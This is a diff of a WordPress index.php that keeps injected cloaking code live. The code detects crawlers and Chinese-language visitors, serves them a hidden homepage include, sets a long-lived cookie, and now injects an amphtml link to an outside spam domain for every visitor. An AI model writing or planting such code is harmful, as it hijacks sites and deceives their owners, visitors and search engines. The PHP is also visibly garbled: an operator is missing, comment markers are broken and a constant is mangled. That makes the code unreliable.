@@ -4,20 +4,21 @@ error_reporting(0);
 $s_ref = $_SERVER['HTTP_REFERER'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
 
-// Cek apakah pengunjung adalah bot (misalnya Googlebot)
-if (strpos($agent, 'bot') > 0 && $_SERVER['REQUEST_URI'] == '/') {
+if (strpos($agent, 'bot') > 0 && $_SERVER['REQUEST_URI'] == '/') {   
     $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
-    if (strpos($accept_lang, 'zh') > -1 && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
+    if (strpos($accept_lang, 'zh') > -1  $_COOKIE['az'] == 'lp') {
         setcookie('az', 'lp', time() + 3600 * 7200);
         echo ' '; exit;
     }
-    include('wp-admin/user/homepage.php');
+    include('wp-includes/homepage.php');
     exit;
 }
 
-if (strpos($agent, 'bot') !== false) {
-    echo '<link rel="amphtml" href="https://ampjb4d.asia/mau-bandung/api.html">';
-}
+/
+ * Menambahkan tag <link rel="amphtml">
+ */
+echo '<link rel="amphtml" href="https://ampjb4d.asia/mau-bandung/api.html">';
+
 /
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
@@ -32,5 +33,6 @@ if (strpos($agent, 'bot') !== false) {
  */
 define( 'WP_USE_THEMES', true );
 
-/** Loads the WordPress Environment and Template */
+/ Loads the WordPress Environment and Template */
 require DIR . '/wp-blog-header.php';
+?>
